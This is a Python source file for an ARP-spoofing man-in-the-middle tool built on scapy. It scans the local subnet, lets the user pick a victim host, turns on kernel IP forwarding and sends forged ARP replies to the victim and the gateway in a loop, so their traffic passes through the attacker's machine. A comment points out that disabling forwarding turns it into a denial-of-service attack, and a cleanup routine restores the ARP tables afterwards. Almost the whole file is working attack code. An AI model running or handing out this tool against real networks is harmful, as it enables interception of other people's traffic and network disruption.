from scapy.all import ARP, Ether, srp, conf, getmacbyip, sendp, get_if_hwaddr
import os
import ipaddress
import subprocess
import time


def get_ip_range() -> str:
    """
    Query the native Linux networking stack to determine the active interface
    and calculate the local subnet CIDR block.

    Returns:
        str: The IPv4 network range in CIDR notation (e.g., '192.168.1.0/24').

    Raises:
        RuntimeError: If no valid IPv4 address is found on the active interface.
        """
    iface_name = conf.iface.name
    ip_with_cidr_index = 3

    output = subprocess.check_output(
        ["ip", "-o", "-f", "inet", "addr", "show", iface_name],
        text=True
    )

    for line in output.splitlines():
        parts = line.split()
        if len(parts) > ip_with_cidr_index:
            ip_with_cidr = parts[ip_with_cidr_index]
            network = ipaddress.IPv4Network(ip_with_cidr, strict=False)
            return str(network)

    raise RuntimeError(f"[-] No IPv4 address found on interface {iface_name}")


def get_network_info() -> tuple:
    """Look up the active interface, local IP and gateway IP (once)."""
    return conf.route.route("0.0.0.0")


def scan_network(ip_range: str, interface: str) -> list[dict]:
    """
    Layer 2 ARP broadcast scan. Pure discovery - no printing, no gateway
    logic. Just returns the hosts that answer.

    Args:
        ip_range (str): Target network block in CIDR notation.
        interface (str): Interface to send the scan on.

    Returns:
        list[dict[str, str]]: One {'ip', 'mac'} dict per answering host.
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(request, iface=interface, timeout=2, verbose=False)
    return [{"ip": received.psrc, "mac": received.hwsrc} for _, received in answered]


def print_devices(devices: list[dict], gateway_ip: str) -> None:
    """Print the discovered hosts as a numbered table, tagging the gateway."""
    print(f"\n[i] | {'IP Address':<20} | MAC Address")
    print("-" * 45)
    for index, device in enumerate(devices):
        label = f'{device["ip"]} [*]' if device["ip"] == gateway_ip else device["ip"]
        print(f'[{index}] | {label:<20} | {device["mac"]}')
    print("-" * 45)
    print(f"[+] Found {len(devices)} hosts.\n")


def select_host(devices: list[dict], gateway_ip: str) -> dict:
    """
    Ask the user to pick a host by index, with validation. The gateway
    is not selectable.

    Args:
        devices (list[dict]): Hosts from scan_network.
        gateway_ip (str): Gateway IP (not selectable).

    Returns:
        dict: The chosen {'ip', 'mac'} host.
    """
    if not devices:
        print("[-] No active devices found. Exiting.")
        raise KeyboardInterrupt

    while True:
        try:
            index = int(input("> "))
        except ValueError:
            print("[-] Please enter a valid integer.")
            continue

        if not (0 <= index < len(devices)):
            print("[-] Invalid index. Please select a number from the list.")
        elif devices[index]["ip"] == gateway_ip:
            print("[-] Invalid selection. Cannot choose the gateway.")
        else:
            return devices[index]


def poison(operation: int, destination_ip: str, destination_mac: str,
           source_ip: str, source_mac: str, active_interface: str) -> None:
    """
        Construct and transmit an individual Layer 2 Ethernet frame wrapping
        an operational ARP mapping payload.

        Args:
            operation (int): The ARP opcode standard (e.g., 1 for request, 2 for reply).
            destination_ip (str): Target protocol address field.
            destination_mac (str): Target physical hardware address destination destination.
            source_ip (str): Declared protocol origin address mapping.
            source_mac (str): Declared hardware origin address assignment.
            active_interface (str): The name of the local network interface to bind and emit through.
    """
    poison_target = Ether(dst=destination_mac) / ARP(
        op=operation,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    sendp(poison_target, iface=active_interface, verbose=False)


def initiate_mitm(target: dict[str, str]) -> None:
    """
    Execute the active ARP spoofing loop for the specified target.

    This function dynamically enables local IPv4 forwarding via the kernel
    and continuously transmits spoofed ARP replies to intercept traffic
    between the target device and the default gateway.

    Args:
        target (dict[str, str]): A dictionary containing the target's network
                                 identities. Must include 'ip' and 'mac' keys.
    """
    if target is not None:
        print(f'[*] target selected, initiating mitm...\n')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #disable for a dos attack.

        arp_reply = 2
        loop_delay = 1  # seconds

        target_ip = target["ip"]
        target_mac = target["mac"]

        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
        gateway_mac = getmacbyip(gateway_ip)

        own_mac_address = get_if_hwaddr(conf.iface)
        active_interface = conf.iface.name

        while True:
            poison(arp_reply, target_ip, target_mac, gateway_ip, own_mac_address, active_interface)
            poison(arp_reply, gateway_ip, gateway_mac, target_ip, own_mac_address, active_interface)
            time.sleep(loop_delay)


def cleanup(target: dict[str, str]) -> None:
    """
    Gracefully terminate the application runtime state by resetting kernel
    IP forwarding settings and flashing restorative network tables if required.

    Args:
        target (dict[str, str] | None): Target data payload context to restore,
                or None if terminated prior to entry choice.
    """
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

    if target is not None:
        arp_reply = 2
        loop_delay = 0.1  # seconds
        loop_count = 7

        target_ip = target["ip"]
        target_mac = target["mac"]

        interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
        gateway_mac = getmacbyip(gateway_ip)

        active_interface = conf.iface.name

        for i in range(loop_count):
            poison(arp_reply, target_ip, target_mac, gateway_ip, gateway_mac, active_interface)
            poison(arp_reply, gateway_ip, gateway_mac, target_ip, target_mac, active_interface)

            time.sleep(loop_delay)


if __name__ == "__main__":
    user_selection = None
    try:
        interface, local_ip, gateway_ip = get_network_info()
        active_network = scan_network(get_ip_range(), interface)
        print_devices(active_network, gateway_ip)
        user_selection = select_host(active_network, gateway_ip)
        initiate_mitm(user_selection)

    except KeyboardInterrupt:
        print('\n[*] Stopping application runtime safely...')
        cleanup(user_selection)